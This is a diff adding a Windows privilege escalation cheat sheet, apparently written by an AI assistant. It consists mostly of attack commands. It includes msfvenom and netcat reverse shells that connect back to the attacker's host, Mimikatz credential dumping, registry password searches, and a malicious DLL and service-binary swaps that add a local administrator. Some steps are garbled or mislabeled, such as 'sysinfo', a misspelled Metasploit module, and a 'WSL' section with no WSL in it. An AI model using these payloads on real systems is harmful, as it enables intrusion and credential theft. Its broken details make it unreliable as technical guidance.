@@ -1,0 +1,186 @@
+# Windows Privilege Escalation Notes
+
+## **Escalation Path: Kernel Exploits**
+
+### **Automated Exploit Suggestion**
+1. Save system information to a file:
+   ```bash
+   sysinfo > sysinfo.txt
+   ```
+2. Use Windows Exploit Suggester:
+   ```bash
+   ./windows-exploit-suggester.py --database 2020-04-17-mssb.xls --systeminfo sysinfo.txt
+   ```
+
+### **Escalation with Metasploit**
+1. In Meterpreter:
+   ```bash
+   run post/multi/recon/local_exploit_suggester
+   ```
+2. Select an exploit:
+   ```bash
+   use <preferred exploit>
+   ```
+
+### **Manual Kernel Exploitation Example**
+1. Generate a payload:
+   ```bash
+   msfvenom -p windows/shell_reverse_tcp LHOST=<your IP> LPORT=9999 -f aspx > manual.aspx
+   ```
+2. Upload to target:
+   ```bash
+   ftp <target>
+   put manual.aspx
+   ```
+3. Load in browser, then execute:
+   ```bash
+   certutil -urlcache -f <your file location> <new file name>
+   <exploit> <your IP> <port>
+   ```
+
+---
+## **Escalation Path: Stored Passwords & Port Forwarding**
+
+### **Extracting Stored Passwords**
+1. Generate a payload:
+   ```bash
+   msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=<your IP> LPORT=9999 -e x86/unicode_mixed -b '<bad-chars>' BufferRegister=EAX -f python
+   ```
+2. Use in exploit:
+   ```bash
+   python <exploit.py>
+   ```
+3. Query registry for credentials:
+   ```bash
+   reg query HKLM /f password /t REG_SZ /s
+   reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+   ```
+
+### **Port Forwarding via Plink**
+1. Transfer `plink.exe`:
+   ```bash
+   plink.exe -l root -pw <password> -R <machine>:<port> <your IP>
+   ```
+2. Verify connection:
+   ```bash
+   netstat -ano | grep <port>
+   ```
+3. Execute remote commands:
+   ```bash
+   winexe -U <username>%<password> //127.0.0.1 "cmd.exe"
+   ```
+
+---
+## **Escalation Path: Windows Subsystem for Linux (WSL)**
+
+### **Privilege Escalation via WSL**
+1. Use `psexec.py`:
+   ```bash
+   psexec.py <username>:’<password>’@<IP>
+   ```
+2. Access SMB shares:
+   ```bash
+   smbclient \\<IP>\\<share> -U <user>
+   ```
+3. Upload a reverse shell:
+   ```php
+   <?php
+   system('nc.exe -e cmd.exe <your ip> <port>');
+   ?>
+   ```
+4. Execute and get shell.
+
+---
+## **Impersonation & Potato Attacks**
+
+### **Token Impersonation**
+1. In Meterpreter:
+   ```bash
+   load incognito
+   list_tokens -u
+   impersonate_token <domain>\\<user>
+   shell
+   ```
+2. In Mimikatz:
+   ```bash
+   Invoke-Mimikatz -Command ‘"privilege::debug" "LSADUmp::LSA /patch" exit’ -Computer <USER>.domain.name
+   ```
+
+### **Potato Attacks**
+1. Check for vulnerable tokens:
+   ```bash
+   whoami /priv
+   ```
+2. Exploit using Metasploit:
+   ```bash
+   use windows/local/m16_075_reflection
+   ```
+
+---
+## **DLL Hijacking**
+
+### **Identifying Vulnerable DLLs with Procmon**
+1. Open `Procmon.exe` as administrator.
+2. Apply filter:
+   - **Result:** `NAME NOT FOUND`
+   - **Path:** Ends with `.dll`
+3. If found, follow exploitation steps:
+
+### **Exploitation Steps**
+1. Create a malicious DLL:
+   ```c
+   #include <windows.h>
+   
+   BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
+       system("cmd.exe /k net localgroup administrators user /add");
+       return TRUE;
+   }
+   ```
+2. Compile DLL:
+   ```bash
+   x86_64-w64-mingw32-gcc exploit.c -shared -o hijackme.dll
+   ```
+3. Replace vulnerable DLL.
+4. Restart the vulnerable service.
+
+---
+## **Additional Paths**
+
+### **AlwaysInstallElevated**
+1. Check registry:
+   ```bash
+   reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+   ```
+2. Exploit:
+   ```bash
+   msiexec /quiet /qn /i setup.msi
+   ```
+
+### **Executable Hijacking**
+1. Locate vulnerable executables:
+   ```bash
+   C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
+   ```
+2. Replace with malicious executable:
+   ```bash
+   copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
+   ```
+3. Restart the service:
+   ```bash
+   sc start filepermsvc
+   ```
+
+### **Unquoted Service Paths**
+1. Check for unquoted paths:
+   ```bash
+   sc qc unquotedsvc
+   ```
+2. Exploit:
+   ```bash
+   msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+   ```
+3. Move file and restart service.
+
+---
+This guide covers common privilege escalation techniques on Windows. Let me know if you need further refinements! 🚀
+
